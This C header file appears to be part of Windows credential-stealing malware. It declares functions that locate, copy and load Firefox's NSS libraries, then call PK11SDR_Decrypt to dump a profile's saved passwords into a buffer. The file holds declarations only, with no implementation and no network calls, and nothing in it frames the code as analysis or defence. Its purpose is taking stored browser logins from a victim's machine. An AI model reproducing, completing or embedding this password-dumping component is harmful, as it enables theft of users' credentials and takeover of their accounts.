#ifndef _FFOX_PASSWORD
#define _FFOX_PASSWORD

typedef struct PK11SlotInfoStr PK11SlotInfo;

VOID DumpFFoxPasswords(LPBYTE *lpBuffer, LPDWORD dwBuffSize);
BOOL GetFFoxLibPath();
BOOL CopyDll(LPWSTR strSrcFullPath, LPWSTR strDstPath, LPWSTR strDstFileName, LPWSTR *strOutFileName);
BOOL GetFFoxLibPath();
BOOL CopyAndLoadFFoxLibrary();
VOID UnloadFirefoxLibs();
LPWSTR DecryptString(LPSTR strCryptData);

typedef enum SECItemType
{
    siBuffer = 0,
    siClearDataBuffer = 1,
    siCipherDataBuffer = 2,
    siDERCertBuffer = 3,
    siEncodedCertBuffer = 4,
    siDERNameBuffer = 5,
    siEncodedNameBuffer = 6,
    siAsciiNameString = 7,
    siAsciiString = 8,
    siDEROID = 9,
    siUnsignedInteger = 10,
    siUTCTime = 11,
    siGeneralizedTime = 12
};

struct SECItem
{
    SECItemType type;
    unsigned char *data;
    unsigned int len;
};

typedef DWORD (__cdecl *NSS_Init_p)(LPSTR strProfilePath);
typedef DWORD (__cdecl *NSS_Shutdown_p)();
typedef DWORD (__cdecl *PL_ArenaFinish_p)();
typedef DWORD (__cdecl *PR_Cleanup_p)();
typedef PK11SlotInfo *(__cdecl *PK11_GetInternalKeySlot_p)();
typedef DWORD (__cdecl *PK11_FreeSlot_p)(PK11SlotInfo*);
typedef DWORD (__cdecl *PK11SDR_Decrypt_p)(SECItem *pData, SECItem *pResult, LPVOID cx);


#endif